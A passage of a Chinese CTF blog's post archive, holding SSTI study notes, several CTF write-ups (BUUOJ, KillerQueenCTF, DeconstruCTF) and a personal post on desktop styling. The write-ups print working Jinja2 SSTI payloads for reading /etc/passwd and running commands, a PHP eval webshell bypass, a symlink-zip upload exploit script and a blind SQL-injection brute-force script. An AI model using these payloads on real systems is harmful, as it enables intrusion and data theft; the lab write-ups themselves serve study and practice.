readlines()进行文件读写\n().__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() ().__class__.__base__.__subclasses__()[40](\u0026#39;/tmp\u0026#39;).write(\u0026#39;test\u0026#39;) os模块就不必说了，有system()可以直接rce的函数；在py2中这两个子类可以直接用\n# \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;, 71 # \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;, 76 ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].system(\u0026#39;whoami\u0026#39;) {{().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].__dict__.environ[\u0026#39;FLAG]}} 不嫌麻烦的还可以再套一层，用linecache来调用os，py2中有这两个类含有linecache模块\n# \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;, 58 # \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;, 59 [].__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;os\u0026#39;].__dict__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) py3 - __builtins__ py3中就没这么直接，要关注的模块是__builtins__，借助它来调用内置的open()进行文件读写，用eval()将os模块引入rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;) ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() 或者是直接用__import__加载os模块执行命令\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() py2有个特殊的commands模块也可以直接rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;commands\u0026#39;).getstatusoutput(\u0026#39;whoami\u0026#39;) ——————注意引用__builtins__内建模块这一方式在py2\u0026amp;py3完全通杀\n常用payload 其实上面已经列举的比较全啦，这里做一些小小的补充\nfor语句确定索引位置 前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑\n{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;filename\u0026#39;, \u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} 特殊的一些对象 {{config}} {{config.items()}} {{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config}} {{app.__init__.__globals__.sys.modules.app.app.__dict__}} {{url_for.__globals__[\u0026#39;__builtins__\u0026#39;].__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;)}} {{url_for.__globals__[\u0026#39;current_app\u0026#39;].config.FLAG}} {{request.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;).read()}} {{request.application.__self__._get_data_for_json.__globals__[\u0026#39;json\u0026#39;].JSONEncoder.default.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} 各种各样的bypass 一般都不会只过滤一种的，综合应用\n针对关键字的过滤 以class为例，做一个字符串的拼接\n  \u0026#39;cl\u0026#39;~\u0026#39;ass\u0026#39;\t# 拼接 \u0026#34;cl\u0026#34;+\u0026#34;ass\u0026#34;   \u0026#39;cla\u0026#39;.join(\u0026#39;ss\u0026#39;)\t# 拼接   \u0026#39;Y2xhc3M=\u0026#39;.decode(\u0026#39;base64\u0026#39;)\t# b64   \u0026#39;\\u0063\\u006C\\u0061\\u0073\\u0073\u0026#39;\t# unicode   \u0026#39;\\x63\\x6c\\x61\\x73\\x73\u0026#39;\t# hex   过滤[] []用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用\n  __getitem__\n().__class__.__base__.__subclasses__().__getitem__(index).__init__.__globals__.__getitem__(\u0026#39;__builtins__\u0026#39;).__getitem__(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)   pop()\n().__class__.__base__.__subclasses__().pop(index).__init__.__globals__.pop(\u0026#39;__builtins__\u0026#39;).pop(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)   .\n().__class__.__bases__.0.__subclasses__().index.__init__.__globals__.linecache.os.popen(\u0026#39;whoami\u0026#39;).read()   过滤. .点号用在向下不停地取值，跟[]很像\n  \u0026#34;\u0026#34;.__class__ == \u0026#34;\u0026#34;[\u0026#34;__class__\u0026#34;]   attr() 很强的一个flask内置filter，foo|attr(\u0026quot;bar\u0026quot;) == foo.bar\n{{()|attr(\u0026#39;__class__\u0026#39;)|attr(\u0026#39;__base__\u0026#39;)............}}   过滤'   chr 先找出chr()的位置（注意跑脚本跑的是__builtins__ 这个函数是内建的），用模板语句给它赋个值，然后调用\n{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}   request.args flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用\n{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}\u0026amp;arg1=os   过滤_   request.args\n{{\u0026#39;\u0026#39;[request.args.class][request.args.base][request.args.subclasses]()[index](\u0026#39;/etc/passwd\u0026#39;).read() }}\u0026amp;class=__class__\u0026amp;base=__base__\u0026amp;subclasses=__subclasses__ 这种方式可以结合get和post，举例-\u0026gt;[CTFshow 击剑杯]通关大佬，在不同的字段处对传入参数的限制是不同的\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021年11月11日   按字符串的方式走，也可\n  过滤{   {{}} == {% %}   过滤   +替代  其它姿势 短短短 利用的是Flask中的config对象，它可以存储一部分设置项的内容；config.update方法可以用来存储设置项中的变量，用法是config.update(key=value)\n这里用一个题做例子，指路-\u0026gt;[Digital Overdose 2021 Autumn CTF madlib]\n***pwn - 劫持got表getshell pwn，在学了在学了，指新建文件夹和md文档😅\n参考：Python 沙箱逃逸\nTornado Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce\n内置字典对象   handler.settings 指向的是RequestHandler.application.settings\n{{handler.settings}} {{escape(handler.settings[\u0026#34;cookie\u0026#34;])}}   Django Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章-\u0026gt;Python 格式化字符串漏洞（Django为例）指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息\n 两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了\n这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼\n","date":"2021-11-08T20:59:28+08:00","permalink":"https://amiaaaz.github.io/2021/11/08/ssti-study-notes/","section":"posts","tags":["SSTI"],"title":"SSTI学习笔记"},{"categories":["CTF","LTS"],"contents":"buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web\n下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ\nEzsql FIX 200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式\nmysql预处理 其中201行的ss指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应\nPDO预处理 PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理\n[CISCN2021 总决赛]babypython FIX ssh连上后看下目录结构\n查看/app/y0u_found_it/y0u_found_it_main.py\n11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用uuid/guid生成器来生成\n ————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是\n 关于本题 是个原题，还是个有了包浆的原题，参见-\u0026gt;[HCTF 2018]Hideandseek | [SWPU2019]Web3，做过的就知道这他妈真的就一模一样hhhhhhhh\n考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 [CISCN2019 华东南赛区]Web4，都快烤烂了\n考点一 · uuid\u0026amp;SECRET_KEY SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 [CISCN2019 华东南赛区]Web4，其中app.py是这样写的\nuuid.getnode()会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在/sys/class/net/eth0/address，读出mac地址后我们也来生成一波伪随机数\n之后通过flask-session-cookie-manager一把梭即可伪造session值\n————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中\n考点二 · linux软链接文件读取\u0026amp;zip压缩包 ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用/proc/self/cwd来指向当前进程的目录\nln -s /proc/self/cwd/flag/flag/.jpg qwe 或者通过/proc/self/environ文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-\u0026gt;/proc目录的妙用 | LFItoRCE利用总结，题-\u0026gt;[网鼎杯 2020 白虎组]PicDown\nln -s /proc/self/environ qwe 而对于目录内文件的列举也是有方法的，参见-\u0026gt;34C3 CTF Web题 extract0r Writeup\n甚至也可以写入shell，参见-\u0026gt;[深育杯 2021]Zipzip\n制作好的软链接通过zip打包\nzip -ry qwe.zip qwe 更多题目中的应用可以参见-\u0026gt;记录一道题的多种解法\n关于这个漏洞的实际应用可以参见-\u0026gt;GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞\n*ATTACK exp.py - 1 生成软链接\u0026amp;zip\u0026amp;自动上传\nimport requests import os import sys url = \u0026#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload\u0026#39; def makezip(): os.system(\u0026#39;ln -s \u0026#39;+sys.argv[1]+\u0026#39; exp\u0026#39;) # os.system(\u0026#39;zip --symlinks exp.zip exp\u0026#39;) os.system(\u0026#39;zip -ry exp.zip exp\u0026#39;) makezip() files = {\u0026#39;the_file\u0026#39;:open(\u0026#39;./exp.zip\u0026#39;, \u0026#39;rb\u0026#39;)} def exploit(): res = requests.post(url, files=files) print(res.text) exploit() os.system(\u0026#39;rm -rf exp\u0026#39;) os.system(\u0026#39;rm -rf exp.zip\u0026#39;) python3 exp.py /proc/self/environ python3 exp.py /app/y0u_found_it.ini python3 exp.py /app/y0u_found_it/y0u_found_it_main.py python3 exp.py /sys/class/net/eth0/address exp.py - 2 根据mac地址生成伪随机数\nimport uuid import random mac = \u0026#34;02:42:0a:00:cb:06\u0026#34; temp = mac.split(\u0026#39;:\u0026#39;) temp = [int(i,16) for i in temp] temp = [bin(i).replace(\u0026#39;0b\u0026#39;,\u0026#39;\u0026#39;).zfill(8) for i in temp] temp = \u0026#39;\u0026#39;.join(temp) mac = int(temp,2) random.seed(mac) result = str(random.random()*100) print(result) # 36.014406163923596 python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc\u0026#39; python3 flask_session_cookie_manager3.py encode -s \u0026#39;36.014406163923596\u0026#39; -t \u0026#34;{u\u0026#39;username\u0026#39;: u\u0026#39;admin\u0026#39;}\u0026#34; 翻回头看源码，好家伙这里有内鬼\n返回的并不是真正的flag，而是secret.secret中的内容no flah\n67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1\n————这里我感觉原题应该secret.py中的secret=直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（\n***[CISCN2021 总决赛]easy_python 不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机\n***[CISCN2021 总决赛]ezj4va https://juejin.cn/post/6997314123918737422\n还不会java 先空着TAT\n","date":"2021-11-07T08:57:29+08:00","permalink":"https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/","section":"posts","tags":["wp"],"title":"buuoj加固题 Wp"},{"categories":["CTF"],"contents":"web/Just Not My Type  I really don\u0026rsquo;t think we\u0026rsquo;re compatible (Link)\n \u0026lt;?php $FLAG = \u0026#34;shhhh you don\u0026#39;t get to see this locally\u0026#34;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $password = $_POST[\u0026#34;password\u0026#34;]; if (strcasecmp($password, $FLAG) == 0) { echo $FLAG; } else { echo \u0026#34;That\u0026#39;s the wrong password!\u0026#34;; } } ?\u0026gt;我们的老朋友strcasecmp()函数，它和strcmp()函数一样用于比较两个字符串，区别是后者会区分大小写；绕过方式是传入数组，这样会使两个函数无法处理而返回null\nflag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}\nweb/PHat Pottomed Girls  Now it\u0026rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (Link)\n \u0026lt;?php session_start(); function generateRandomString($length = 15) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function filter($originalstring) { $notetoadd = str_replace(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;\u0026#34;, $originalstring); $notetoadd = str_replace(\u0026#34;?\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;\u0026lt;?\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;flag\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fopen\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fread\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;file_get_contents\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;fgets\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cat\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;strings\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;less\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;more\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;head\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tail\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;dd\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;cut\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;grep\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;tac\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;awk\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;sed\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;read\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); $notetoadd = str_replace(\u0026#34;system\u0026#34;, \u0026#34;\u0026#34;, $notetoadd); return $notetoadd; } if(isset($_POST[\u0026#34;notewrite\u0026#34;])) { $newnote = $_POST[\u0026#34;notewrite\u0026#34;]; //3rd times the charm and I\u0026#39;ve learned my lesson. Now I\u0026#39;ll make sure to filter more than once :)  $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[\u0026#34;notes\u0026#34;], \u0026#34;$filename.php\u0026#34;); file_put_contents(\u0026#34;$filename.php\u0026#34;, $notetoadd); header(\u0026#34;location:index.php\u0026#34;); } ?\u0026gt;简单看一下流程，filter()函数会对我们post传入的notewrite参数（也就是会被写入的文件内容）进行比较严格的过滤，文件名是generateRandomString()生成的随机名字，但是不重要，它会自动拼上.php的后缀并且把名字写到session['notes']中；所以我们唯一需要处理的就是filter()函数的绕过了\n尴尬的是这个filter()跟个筛子一样……首先是没有过滤eval()，其次是str_replace()也是水的一批\npayload:\nnotewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B 之后连上蚁剑即可查看根目录下的flag.php\nflag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}\nforensics/Obligatory Shark  remember to wrap the flag\n 看tcp流，telnet明文流量\n33a465747cb15e84a26564f57cda0988\nflag{dancingqueen}\n","date":"2021-10-30T16:39:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/","section":"posts","tags":["wp"],"title":"KillerQueenCTF2021 Wp"},{"categories":["CTF"],"contents":"https://ctftime.org/event/1453/tasks/\nWeb/Here\u0026rsquo;s a Flag  A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?\n https://www.youtube.com/watch?v=dQw4w9WgXcQ 不用看了 Never Gonna Give You Up\n看style.css flag: \u0026ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}\u0026quot;; 但是不是最终的flag，解一下rot13 amount=23\ndsc{we0come_to_deconstructf}\n签到题也好折腾TAT\nWeb/Please  Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company\u0026rsquo;s servers. I know it\u0026rsquo;s been a while, but could you please try to access those files? I would be very grateful!\n 熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy\n改浏览器标识头 User-Agent: DeemBrowser\n需要基础认证，但是这里的MagicWord稍微卡了一下\n原因是我太铸币了忘了加Basic，Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==\n加一个日期的头，Date: Thu, 1 Apr 2021 12:00:00 GMT\n换成Date: Mon, 5 Apr 2021 12:00:00 GMT\ndsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}\nWeb/Taxi Union Problems  An important package has been stolen from Mr Nagaraj by a Taxi driver. We\u0026rsquo;ve tried to ask the local taxi union about driver\u0026rsquo;s location but they are refusing provide the same.\nSince this package is required for a time sensitive matter we don\u0026rsquo;t have time to negotiate with the union.\nYour task is to obtain the location of the taxi using the given information Taxi Lisence Plate: TN-06-AP-9879\nHINT: The flag is the location of the taxi (no caps)\n 输入TN-06-AP-9879'--%20回显一样，有注入，把post的内容拿去让sqlmap跑一下\npython sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate --tables python sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate -T taxi --columns python sqlmap.py -r \u0026quot;/home/amelia/sh4r3/post.txt\u0026quot; -p lisence_plate -T taxi --dump Ayanavaram\n*Web/Never gonna lie to you  Trust me, take everything in the home page for face value. I would never lie to you.\n 主页有一句Not even search engines can find it.，提示我们看/robots.txt\n转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down\n提交两个参数username和password，回显YOU LIED TO ME !!!\n————然后没然后了 我还没看完 环境就关了TAT\nWeb/Curly Fries 1  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. The flag is right in front of you.\n emmmmm 没有任何提示\n看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站\ncurl -i http://very.uniquename.xyz:8880/ -H \u0026#34;Accept-Language: sv-SE\u0026#34; dsc{1_l0v3_sw3d3n}\nWeb/The Gate Keeper  That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.\nNote: This challenge might require a bruteforce approach.\n 还是sqli\nimport requests import string flag = \u0026#39;\u0026#39; print(flag) domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026#39;_}\u0026#39; f = 0 challenge = \u0026#34;gate keeper\u0026#34; url = \u0026#34;\u0026#34; check = \u0026#34;\u0026#34; key = \u0026#34;\u0026#34; column = \u0026#34;\u0026#34; if challenge == \u0026#34;taxi union\u0026#34;: url = \u0026#39;http://extremely.uniquename.xyz:2052/\u0026#39; check = \u0026#34;TN-06-AP-9879\u0026#34; key = \u0026#39;lisence_plate\u0026#39; column = \u0026#34;location\u0026#34; elif challenge == \u0026#39;gate keeper\u0026#39;: url = \u0026#39;http://extremely.uniquename.xyz:2082/\u0026#39; check = \u0026#34;The flag for the CTF is the password you entered.(If you havent cheated that is)\u0026#34; key = \u0026#39;password\u0026#39; column = \u0026#34;password\u0026#34; print(\u0026#34;URL\u0026#34;, url) while True: for char in domain: payload = \u0026#34;\u0026#39; or {}like \u0026#39;{}%\u0026#39;; --\u0026#34;.format(column, flag + char) print(payload) r = requests.post(url, data={key: payload}) if (check in r.text): flag = flag + char print(\u0026#34;Success \u0026#34; + flag) break Web/Hungry Man  There is nothing here I promise! ;)\n 抓包，cookie部分有一个b64，解码后\n说实话，这个题做的时候没注意set-cookie的部分，参考wp\n这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了\ndsc{91v3_m3_4_h4ndfu1_0f_c00k135}\nWeb/Curly Fries 2  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. Why do logos make things so recognizable?\n 无提示，参考wp\n有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag\ndsc{1m4g1n3_l1nux_0n_4n_xb0x}\nWeb/Curly Fries 3  Normal fries are nice, but everything\u0026rsquo;s better with a curl in it. I\u0026rsquo;m with you, every step of the way.\n 直接访问提示405，post一下回显perhaps try Googling me instead?\n访问/robots.txt，404\n用wappalyzer可以看到这是一个flask应用\n参考wp\n看到第一个提示之后不够敏感，我们可以设置来源refer是google.com\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; http://overly.uniquename.xyz:2095/ 回显中提示我们再设置Host\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H\u0026quot;Host:https://dscvit.com\u0026quot; http://overly.uniquename.xyz:2095/ 回显potates and carrots are my friends, milk and Cookies will be my end，不是很明显，但是应该设置cookie=root\n之后回显JFATHER, JMOTHER, JDAUGHTER, ____?，提示把content-type改为json\n回显*{\u0026lsquo;error\u0026rsquo;: \u0026lsquo;json data missing\u0026rsquo;}*，添加一点data\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H \u0026quot;Host: https://www.dscvit.com\u0026quot; -H \u0026quot;Content-Type: application/json\u0026quot; --cookie \u0026quot;user=root\u0026quot; -d '{\u0026quot;foo\u0026quot;:\u0026quot;bar\u0026quot;}' http://overly.uniquename.xyz:2095/ 回显*{\u0026lsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;required\u0026rsquo;}}，将foo改为bar，回显{\u0026lsquo;error\u0026rsquo;: {\u0026lsquo;messi\u0026rsquo;: \u0026lsquo;which club am i at?'}}*\n*不太懂为啥这就能知道把bar赋值为PSG？？？\ncurl -i -X POST -H \u0026quot;Referer: https://www.google.com\u0026quot; -H \u0026quot;Host: https://www.dscvit.com\u0026quot; -H \u0026quot;Content-Type: application/json\u0026quot; --cookie \u0026quot;user=root\u0026quot; -d '{\u0026quot;messi\u0026quot;:\u0026quot;psg\u0026quot;}' http://overly.uniquename.xyz:2095/ 得到flag dsc{th15_15_w4y_t00_much_w0rk}\nWeb/Mega Mailer  We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?\n 讲真，之前没接触过\n首先在自己的vps上开一个smtp的服务，用python开\npython3 -m smtpd -c DebuggingServer -n 0.0.0.0:25 然后其它信息正常填，body部分存在ssti注入，payload来自于PayloadsAllTheThings\n{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}} {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}} dsc{819_8r41n_m41L3R}\n参考：wp\n 说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早\n","date":"2021-10-30T13:35:32+08:00","permalink":"https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/","section":"posts","tags":["wp"],"title":"DeconstruCTF2021 Wp"},{"categories":[],"contents":"除了电脑，代码，网络之外的生活，也是要认真对待噢\n","date":"2021-10-28T18:36:27+08:00","permalink":"https://amiaaaz.github.io/relax/","section":"","tags":[],"title":"Just Relax here......"},{"categories":[],"contents":"写在前面 这将肯定是个长期更新的系列了……\n我对于“美化xx”总有一种痴迷的爱好，小学的时候就折腾过雨滴桌面（现在翻qq邮箱 还能找到14年的远古邮件）虽然可惜的是当时的截图没有保留下来，但印象中是很漂亮很漂亮的\n也是那个时候，开始给自己的手机刷机 为了换更好看的字体和模块（那是个海信的安卓机 很便宜 也是人生中第一部手机），害 当然用的是xx一键root工具之类的，结果刚刷好一会就变砖了 = =（当然这不重要）\n初中之后手机也换成了小米，更是三天两头的刷主题商店 构思怎么混搭出最好看的个性主题，但是也就止步于此 高中之后课余时间变少，也慢慢没有空对自己的手机好好的美化 电脑更是不怎么用了；其间倒是倒腾过一段时间的钢笔彩墨 现在还有不少囤货，坛水呀 鲶鱼呀 百乐呀 还有很多其他牌子的墨现在还都在书桌的台子上，各种 花里胡哨又毫无卵用十分好看的笔现在也被相当规整的收在了用作展示的亚克力架子上（是一种可以斜着放笔的架子 图片如下 我有6个这样的收纳笔筒 勉强够放我的笔们）包括很多很贵的限定笔TAT 现在回头再看好心疼钱 太败家了\n兜兜转转，直到大一的寒假才再把手机和电脑方面的美化给拾起来，然而活力和劲头不减当年\n前几天搭博客的时候就想 除了wp和一些学习笔记之外，还有什么是既值得自己记录 又值得分享出来的呢？ （虽然并没有人会看就是了） 脑子里第一个蹦出来的就是\u0026quot;beautify\u0026quot;——这是最最适合不过的了！！！\n所以先简单概述一下现状 目前的手机是小米10，备用机是小米5sp（没错 就是那个骁龙825发热狂魔……无比后悔当时因为小米6没有3.5mm耳机孔而毅然决然地选择了它）电脑是小新pro16独显版，综合性能都还可以\n手机和电脑作为平时的主要生产力工具，美化的方向和注意点主要有这么几个：\n 色彩搭配要合理，空间结构要有序 有轻巧的快捷小工具来提高效率 自己用着得称心顺手，不随波逐流去选择过于繁杂的美化方式 兼具颜值和实用性，工具最终服务于人，不追求颜值而牺牲性能  所以基于以上的 “圣经”“美化思路”，本篇先从我的pc简单说起吧(ゝ∀･)☆\n————预警：可能会很长很长，大概率之后会修修补补形成一个连~续~剧~\n深色模式？亮色模式！ （先给自己叠层甲）手机上我设置晚上11点以后自动深色模式并且非常喜欢这个功能，让我晚上看手机不再眼瞎\n但是！！！但是！！！使用pc的场景都是环境灯光正常的情况，在这样的情况下深色底配上白色/花里胡哨色的代码真的不会让人眼晕吗！！！我是完全接受不来，哒咩！！！\n所以我的各种terminal\u0026amp;ide\u0026amp;其它种种的配色，全 部 都 是 亮色模式\nkali 这个颜值不用多说吧（\nubuntu vscode 主题：Github Light Theme\nidea 一些基础观念 配色必须统一 一张图就明白了\nedge我喜欢垂直标签页，会让显示空间变大，开四五十个标签页的时候侧栏也不会拥挤，主题是冰凉的薄荷；Chromium的主题是Sea Foam\nedge曾经我觉得一个痛点是不能给标签页分组，直到最近的更新上了这个功能，那这就没啥说的了，在我心中已经超越了Chrome，edge天下第一！\n桌面必须简洁 背景图id=89931517，隐藏了桌面图标和底边任务栏（alt+tab 